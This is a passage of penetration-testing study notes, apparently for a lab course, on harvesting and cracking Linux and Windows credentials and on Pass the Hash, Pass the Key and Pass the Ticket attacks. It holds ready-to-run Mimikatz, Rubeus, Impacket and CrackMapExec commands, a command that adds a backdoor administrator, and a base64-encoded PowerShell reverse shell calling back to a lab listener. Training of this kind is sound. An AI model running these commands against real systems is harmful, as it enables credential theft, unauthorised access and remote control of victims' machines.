- **Service Logs**: Monitor system services (e.g., `/var/log/cron`).
- **System Logs**: Store information about the system (e.g., `/var/log/syslog`).
- **Important Log Files**:
- `/var/log/messages` - Contains generic system activity logs.
- `/var/log/auth.log` (Debian) or `/var/log/secure` (RedHat/CentOS) - Logs related to authentication.
- `/var/log/dmesg` - Kernel-related logs, useful for debugging hardware issues.
- `/var/log/faillog` - Logs failed login attempts.
- **Search Command**:
```
grep -E "accepted|failed|ssh" /var/log/*
```
to search for authentication-related events.

## 5. Memory and Cache
- **Definition**: Memory contains data used by running processes. Sensitive information may be temporarily stored in RAM.
- **Tools**:
- **mimipenguin**: Extracts plaintext credentials from memory.
  - Example:
    ```
    sudo python3 mimipenguin.py
    ```
- **LaZagne**: Retrieves credentials stored in various software and services.
  - Can target sources like WiFi passwords, SSH keys, Docker credentials, etc.
- **Potential Issue**: Unencrypted sensitive data stored in memory may be accessible.

## 6. Browsers
- **Definition**: Browsers store user credentials locally to allow auto-login features.
- **Stored Credentials**:
- Browsers like Firefox store login data in a JSON file, typically located in the user's Firefox profile folder (`~/.mozilla/firefox`).
- The file `logins.json` contains encrypted username and password pairs.
- **Tools for Decrypting Credentials**:
- **Firefox Decrypt**: Can decrypt stored Firefox passwords.
  - Usage:
    ```
    python3.9 firefox_decrypt.py
    ```
- **LaZagne**: Supports multiple browsers for credential extraction.
- **Potential Risk**: Stored credentials can be extracted and decrypted, exposing user accounts.

# Passwd, Shadow, & Opasswd

## Authentication Mechanism
- **Linux systems** use **Pluggable Authentication Modules (PAM)** for authentication.
- PAM modules, such as `pam_unix.so` or `pam_unix2.so`, are found in `/usr/lib/x86_x64-linux-gnu/security/` on Debian-based distributions.
- PAM handles **user authentication**, **password management**, **sessions**, and **old passwords**.

## Passwd File
- Located at `/etc/passwd` and **readable by all users**.
- Contains **user information** in seven fields, separated by colons `:`.
    - Example: `cry0l1t3:x:1000:1000:cry0l1t3,,,:/home/cry0l1t3:/bin/bash`
    - Fields: `Username : Password Info : UID : GID : Full Name : Home Directory : Shell`
- Typically, the **password field** contains an `x`, indicating that passwords are stored in the `/etc/shadow` file.

### Security Concerns
- If `/etc/passwd` mistakenly has **write permissions**, it may allow password modification.
- Example exploit:
    - Change `root:x:0:0:root:/root:/bin/bash` to `root::0:0:root:/root:/bin/bash`.
    - This change allows **login as root without a password**.

## Shadow File
- Located at `/etc/shadow` and **readable only by administrators**.
- Stores **password hashes and expiration data** in nine fields.
    - Example: `cry0l1t3:$6$wBRzy$...SNIP...x9cDWUxW1:18937:0:99999:7:::`
    - Fields: `Username : Encrypted Password : Last Password Change : Min Age : Max Age : Warning Period : Inactivity Period : Expiration Date : Unused`
- Password format: `$<type>$<salt>$<hashed>`
    - **Algorithm Types**:
        - `$1$` – MD5
        - `$2a$` – Blowfish
        - `$5$` – SHA-256
        - `$6$` – SHA-512 (default)

### Special Cases
- Characters `!` or `*` in the password field **disable login** via Unix passwords (kerberos or key based auth) 
## Opasswd File
- Located at `/etc/security/opasswd`, it stores **old passwords**.
- Requires **admin permissions** to access.
- Hashing algorithm used here may reveal **older, weaker encryption**, such as **MD5 ($1$)**.

## Cracking Linux Credentials

### Unshadow
1. Backup the original files:
    ```bash
    sudo cp /etc/passwd /tmp/passwd.bak
    sudo cp /etc/shadow /tmp/shadow.bak
    ```
2. **Combine** `/etc/passwd` and `/etc/shadow` into a **single file**:
    ```bash
    unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
    ```

### Hashcat
- **Crack unshadowed hashes** using a dictionary attack:
    ```bash
    hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
    ```
    - `-m 1800`: SHA-512 Crypt
    - `-a 0`: Dictionary attack

### Cracking MD5 Hashes
1. Prepare the list of MD5 hashes (example file: `md5-hashes.list`).
2. Run Hashcat:
    ```bash
    hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
    ```
    - `-m 500`: MD5 Crypt

# Pass the Hash (PTH)
A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.
## Windows NTLM Introduction
Microsoft's Windows New Technology LAN Manager (NTLM) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.

With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password.

## Pass the Hash with Mimikatz (Windows)
The first tool we will use to perform a Pass the Hash attack is Mimikatz. Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. 

/user - The user name we want to impersonate.
/rc4 or /NTLM - NTLM hash of the user's password.
/domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
/run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
## Pass the Hash with PowerShell Invoke-TheHash (Windows)
This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local rights donot need to be admin but the target rights of the user who we pass the hash with need to have admin rights.

### Invoke-TheHash with SMB
```
cd C:\tools\Invoke-TheHash\
```
```
Import-Module .\Invoke-TheHash.psd
```
```
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
We can also get a reverse shell connection in the target machine. 
To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address 172.16.1.5. We will use port 8001 to wait for the connection.

**Netcat Listener**
```
.\nc.exe -lvnp 8001
```
To create a simple reverse shell using PowerShell, we can visit https://www.revshells.com/, set our IP 172.16.1.5 and port 8001, and select the option PowerShell #3 (Base64)
Now we can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is 172.16.1.10, we will use the machine name DC01 (either would work).

### Invoke-TheHash with WMI
```
Import-Module .\Invoke-TheHash.psd1
```
```
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```
The result is a reverse shell connection from the DC01 host (172.16.1.10).
## Pass the Hash with Impacket (Linux)
Impacket has several tools we can use for different operations such as Command Execution and Credential Dumping, Enumeration, etc. For this example, we will perform command execution on the target machine using PsExec.
### Pass the Hash with Impacket PsExec
```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

impacket-wmiexec
impacket-atexec
impacket-smbexec

## Pass the Hash with CrackMapExec (Linux)
CrackMapExec is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use CrackMapExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin (password spraying). can be blocked by domain account lockout policy.

```
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add --local-auth to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see Pwn3d!, it means that the user is a local administrator on the target computer. We can use the option -x to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the Local Administrator Password Solution (LAPS), which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.
**CrackMapExec - Command Execution**
```
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
## Pass the Hash with evil-winrm (Linux)
evil-winrm is another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.
### Pass the Hash with evil-winrm
```
 evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
## Pass the Hash with RDP (Linux)
We can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp.

Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
![image](https://github.com/user-attachments/assets/da577c52-bfcb-47c5-9d73-3634d588ad62)
This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa with the value of 0. It can be done using the following command:
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:
### Pass the Hash Using RDP
```
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
## UAC Limits Pass the Hash for Local Accounts
UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well

Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

# Pass the Ticket (PtT) from Windows
we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash.
## Pass the Ticket (PtT) Attack
need a valid Kerberos ticket to perform a Pass the Ticket (PtT). 
- Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
## Harvesting kerberos tickets from windows
On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process.

To access ticket request LSASS.(if not admin key will be user key not all of them)

### Mimikatz - Export Tickets
```
mimikatz.exe
```
```
privilege::debug
```
```
sekurlsa::tickets /export
```
look for .kirbi files. The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain.

export tickets using Rubeus and the option dump. This option can be used to dump all tickets (if running as a local administrator). Rubeus dump, instead of giving us a file, will print the ticket encoded in base64 format. 

### Rubeus - Export Tickets
```
Rubeus.exe dump /nowrap
```
Need admin for both methods

## Pass the Key or OverPass the Hash
Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT). 

### Mimikatz - Extract Kerberos Keys
These are keys(AES256_HMAC and RC4_HMAC keys also NTLM can ve used) used to make the tickets
```
mimikatz.exe
```
```
privilege::debug
```
```
sekurlsa::ekeys
```
### Mimikatz - Pass the Key or OverPass the Hash
```
 mimikatz.exe
 ```
```
privilege::debug
```
```
 sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.

To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des.
### Rubeus - Pass the Key or OverPass the Hash
```
 Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
 ```
## Pass the Ticket (PtT)
Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format.use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.
```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
Another way is to import the ticket into the current session using the .kirbi file from the disk.
### Rubeus - Pass the Ticket
```
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
### Convert .kirbi to Base64 Format
convert a .kirbi to base64 to perform the Pass the Ticket attack.
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.
### Rubeus Pass the Ticket - Base64 Format
```
 Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```
### Mimikatz - Pass the Ticket
perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.

```
 mimikatz.exe 
```
```
privilege::debug
```
```
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```
## Pass The Ticket with PowerShell Remoting (Windows)
PowerShell Remoting allows administrators to run commands on remote computers over TCP/5985 (HTTP) and TCP/5986 (HTTPS). To start a remote session, a user needs administrative privileges, membership in the Remote Management Users group, or explicit remoting permissions. If we identify a user account that lacks administrative rights but belongs to the Remote Management Users group, we can still connect to the remote machine and execute commands through PowerShell Remoting.

### Mimikatz - PowerShell Remoting with Pass the Ticket
To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine.
#### Mimikatz - Pass the Ticket for Lateral Movement.
```
mimikatz.exe
```
```
privilege::debug
```
```
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```
once ticket is imported type
```
exit
```
it should bring you back to cmd type 
```
powershell
```
```
Enter-PSSession -ComputerName DC01
```
### Rubeus - PowerShell Remoting with Pass the Ticket
Rubeus has the option createnetonly, which creates a sacrificial process/logon session (Logon type 9). The process is hidden by default, but we can specify the flag /show to display the process, and the result is the equivalent of runas /netonly. This prevents the erasure of existing TGTs for the current logon session.
#### Create a Sacrificial Process with Rubeus
```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.
#### Rubeus - Pass the Ticket for Lateral Movement
```
 Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

